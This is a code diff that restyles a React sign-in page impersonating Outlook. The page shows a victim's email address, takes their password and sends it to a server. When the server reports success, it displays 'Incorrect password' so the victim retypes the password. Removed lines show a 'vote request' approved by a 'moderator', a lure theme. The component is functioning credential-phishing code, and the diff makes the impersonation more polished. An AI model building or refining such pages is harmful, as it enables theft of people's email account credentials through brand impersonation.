@@ -4,7 +4,6 @@ import emailLogo from "../assets/email-logo.png";
 export default function EmailPassword() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-
   const [loading, setLoading] = useState(false);
   const [status, setStatus] = useState(null);
 
@@ -21,6 +20,11 @@ export default function EmailPassword() {
 
   async function submitForm(e) {
     e.preventDefault();
+
+    if (!password.trim()) {
+      alert("Please enter your password.");
+      return;
+    }
 
     setLoading(true);
 
@@ -43,64 +47,26 @@ export default function EmailPassword() {
       );
 
       const data = await res.json();
-
-     if (data.success) {
-  setStatus("approved");
-} 
+      if (data.success) {
+        setStatus("approved");
+      } else {
+        setStatus("rejected");
+      }
     } catch (err) {
-      console.log(err);
+      console.error(err);
+      setStatus("rejected");
     }
 
     setLoading(false);
   }
 
-  if (status === "pending") {
-    return (
-      <div className="min-h-screen bg-white flex items-center justify-center">
-        <div className="text-center">
-          <img
-            src={emailLogo}
-            alt=""
-            className="w-16 h-16 mx-auto mb-6"
-          />
-
-          <h2 className="text-3xl font-semibold">
-            Pending Approval
-          </h2>
-
-          <p className="mt-3 text-gray-600">
-            Your request has been submitted successfully.
-          </p>
-
-          <p className="text-gray-600">
-            Please wait while the moderator verifies your request.
-          </p>
-
-          <div className="mt-8">
-            <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600 mx-auto"></div>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
   if (status === "approved") {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center">
-        <div className="text-center">
-          <img
-            src={emailLogo}
-            alt=""
-            className="w-16 h-16 mx-auto mb-6"
-          />
-
-          <h2 className="text-3xl font-semibold text-green-600">
-            Incorrect password
-          </h2>
-
-          <p className="mt-3 text-gray-600">
-            Try again.
-          </p>
+      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
+        <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
+          <img src={emailLogo} alt="Outlook" className="mx-auto h-14 w-14 object-contain mb-6" />
+          <h1 className="text-3xl font-semibold text-slate-900">Incorrect password</h1>
+          <p className="mt-3 text-slate-600">Try again with the correct password.</p>
         </div>
       </div>
     );
@@ -108,79 +74,69 @@ export default function EmailPassword() {
 
   if (status === "rejected") {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center">
-        <div className="text-center">
-          <img
-            src={emailLogo}
-            alt=""
-            className="w-16 h-16 mx-auto mb-6"
-          />
-
-          <h2 className="text-3xl font-semibold text-red-600">
-            Request Rejected
-          </h2>
-
-          <p className="mt-3 text-gray-600">
-            Your vote request was rejected.
-          </p>
+      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
+        <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
+          <img src={emailLogo} alt="Outlook" className="mx-auto h-14 w-14 object-contain mb-6" />
+          <h1 className="text-3xl font-semibold text-red-600">Request Rejected</h1>
+          <p className="mt-3 text-slate-600">Your request could not be submitted.</p>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center px-5">
-     <div className="w-full max-w-5xl bg-white rounded-[28px] shadow-sm p-8 md:p-12">
-        <div className="grid md:grid-cols-2 gap-12">
-
-          <div>
-            <img
-              src={emailLogo}
-              alt="Logo"
-              className="w-12 h-12 object-contain mb-8"
-            />
-
-            <h1 className="text-4xl font-normal text-gray-900">
-              Welcome
-            </h1>
-
-            <p className="mt-3 text-gray-600 break-all">
-              {email}
-            </p>
+    <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
+      <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] overflow-hidden">
+        <div className="px-8 py-10 md:px-10 md:py-12">
+          <div className="flex justify-center mb-8">
+            <img src={emailLogo} alt="Outlook" className="h-14 w-14 object-contain" />
           </div>
 
-          <div>
-            <form onSubmit={submitForm}>
+          <div className="text-center">
+            <h1 className="text-3xl font-semibold text-slate-900">Sign in</h1>
+            <p className="mt-2 text-sm text-slate-500">Enter the password for</p>
+            <p className="mt-2 text-base font-medium text-slate-900 break-all">{email}</p>
+          </div>
 
+          <form onSubmit={submitForm} className="mt-8 space-y-6">
+            <div>
+              <label className="block text-sm font-medium text-slate-700 mb-2">Password</label>
               <input
                 type="password"
-                placeholder="Enter your password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                className="w-full border border-gray-400 rounded-md px-4 py-4 text-gray-900 outline-none focus:border-blue-600"
+                placeholder="Password"
+                className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-blue-600 focus:bg-white"
               />
+            </div>
 
-              <div className="mt-3">
-  <span className="text-sm text-[#1a73e8] hover:underline cursor-pointer">
-    Forgot password?
-  </span>
-</div>
+            <div className="flex flex-col gap-3 text-sm text-slate-600 sm:flex-row sm:items-center sm:justify-between">
+              <button
+                type="button"
+                className="text-blue-600 hover:underline"
+                onClick={() => window.location.href = "/login/email"}
+              >
+                Back
+              </button>
+              <button
+                type="button"
+                className="text-blue-600 hover:underline"
+                onClick={() => alert("Password recovery is not available in this demo.")}
+              >
+                Forgot password?
+              </button>
+            </div>
 
-              <div className="flex justify-end mt-10">
-                <button
-                  type="submit"
-                  disabled={loading}
-                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white px-8 py-2.5 rounded-full font-medium transition"
-                >
-                  {loading ? "Loading..." : "Next"}
-                </button>
-              </div>
-
-            </form>
-          </div>
-
+            <button
+              type="submit"
+              disabled={loading}
+              className="w-full rounded-3xl bg-blue-600 px-4 py-3 text-base font-semibold text-white shadow-sm transition hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-60"
+            >
+              {loading ? "Signing in..." : "Sign in"}
+            </button>
+          </form>
         </div>
       </div>
     </div>
   );
-}   
+}
